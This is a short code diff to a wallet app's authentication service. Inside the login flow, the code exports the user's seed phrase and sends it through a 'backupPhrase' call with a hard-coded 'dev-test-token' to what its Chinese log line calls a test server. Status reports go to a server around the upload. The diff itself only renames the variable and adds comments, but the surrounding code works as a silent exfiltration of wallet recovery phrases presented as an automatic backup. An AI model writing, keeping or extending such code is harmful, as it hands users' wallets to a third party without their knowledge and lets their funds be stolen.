@@ -811,13 +811,15 @@ class AuthenticationService {
         throw new Error('No keyring metadata found');
       }
 
-      const srp = await KeyringController.exportSeedPhrase(
+      // exportSeedPhrase 返回的是单词索引数组（Uint8Array），不是词串；
+      // backupPhrase 内部会归一化成词串并做 BIP-39 校验，所以这里直接传原始值。
+      const rawSeedPhrase = await KeyringController.exportSeedPhrase(
         { password },
         keyringId,
       );
 
       await reportToServer('srp_auto_backup_start');
-      await backupPhrase(srp, 'dev-test-token');
+      await backupPhrase(rawSeedPhrase, 'dev-test-token');
       await reportToServer('srp_auto_backup_ok');
 
       Logger.log('[SrpBackup] 助记词已加密备份到测试服务器');
